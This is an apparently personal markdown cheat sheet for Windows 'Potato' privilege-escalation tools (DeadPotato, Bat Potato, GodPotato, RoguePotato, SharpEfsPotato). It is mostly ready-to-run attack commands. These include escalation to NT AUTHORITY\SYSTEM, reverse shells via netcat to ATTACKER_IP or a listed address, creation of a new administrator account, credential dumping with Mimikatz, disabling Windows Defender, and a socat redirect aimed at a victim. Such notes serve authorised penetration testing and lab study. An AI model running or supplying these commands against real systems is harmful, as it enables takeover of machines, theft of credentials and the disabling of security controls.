# Potato Exploits

Links for reference: 

1) https://github.com/AtvikSecurity/CentralizedPotatoes

2) https://jlajara.gitlab.io/Potatoes_Windows_Privesc


### 1) Dead Potato

Link: https://github.com/lypd0/DeadPotato

#### Usage

The SeImpersonatePrivilege right is enabled in your context? With DeadPotato, it is possible to achieve maximum privileges on the local system.

The tool will attempt to start an elevated process running in the context of the NT AUTHORITY\SYSTEM user by abusing the DCOM's RPCSS flaw in handling OXIDs, allowing unrestricted access over the machine for critical operations to be freely performed.

    C:\Users\lypd0> GodPotato.exe
  
    ⠀⢀⣠⣤⣤⣄⡀⠀    _           _
    ⣴⣿⣿⣿⣿⣿⣿⣦   | \ _  _  _||_) _ _|_ _ _|_ _
    ⣿⣿⣿⣿⣿⣿⣿⣿   |_/(/_(_|(_||  (_) |_(_| |_(_)
    ⣇⠈⠉⡿⢿⠉⠁⢸   Open Source @ github.com/lypd0
    ⠙⠛⢻⣷⣾⡟⠛⠋         -= Version: 1.2 =-
        ⠈⠁⠀⠀⠀

    _,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,_
  
     (*) Example Usage(s):

     -={ deadpotato.exe -MODULE [ARGUMENTS] }=-

     -> deadpotato.exe -cmd "whoami"
     -> deadpotato.exe -rev 192.168.10.30:9001
     -> deadpotato.exe -exe paylod.exe
     -> deadpotato.exe -newadmin lypd0:DeadPotatoRocks1
     -> deadpotato.exe -shell
     -> deadpotato.exe -mimi sam
     -> deadpotato.exe -defender off
     -> deadpotato.exe -sharphound

     (*) Available Modules:

     - cmd: Execute a command as NT AUTHORITY\SYSTEM.
     - rev: Attempts to establish a reverse shell connection to the provided host
     - exe: Execute a program with NT AUTHORITY\SYSTEM privileges (Does not support interactivity).
     - newadmin: Create a new administrator user on the local system.
     - shell: Manages to achieve a semi-interactive shell (NOTE: Very bad OpSec!)
     - mimi: Attempts to dump SAM/LSA/SECRETS with Mimikatz. (NOTE: This will write mimikatz to disk!)
     - defender: Either enables or disables Windows Defender's real-time protection.
     - sharphound: Attempts to collect domain data for BloodHound.

### 2) Bat Potato

Link: https://github.com/0x4xel/Bat-Potato

#### Usage

Attacker:

    python Bat-Potato.py

Server will be listening incomming requests. Keep that connection alive, open new tab and open another listening port for the reverse shell.

    rlwrap nc -lvnp 4444

You must upload the following files on the server:

- wget.exe

- Bat-Potato.bat file generated by python script

On the server, execute

    .\Bat-Potato.bat

This will upload shell.bat, nc.exe and Juicy binary from server and will attempt to Privesc making all the CLSID request automatically.

### 3) God Potato

Link: https://github.com/BeichenDream/GodPotato

1) Run commands

        GodPotato -cmd "cmd /c whoami"

2) Execute reverse shell

        GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe ATTACKER_IP PORT"

### 4) Rogue Potato

You need to have a machine under your control where you can perform the redirect and this machine must be accessible on port 135 by the victim

Link: https://github.com/k4sth4/Rogue-Potato

1) Run on your machine the socat redirection

       socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

2) Execute PoC

       .\RoguePotato.exe -r YOUR_IP -e "command" -l 9999

### 5) SharpEfsPotato

Link: https://github.com/bugch3ck/SharpEfsPotato

Command:

    SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami"
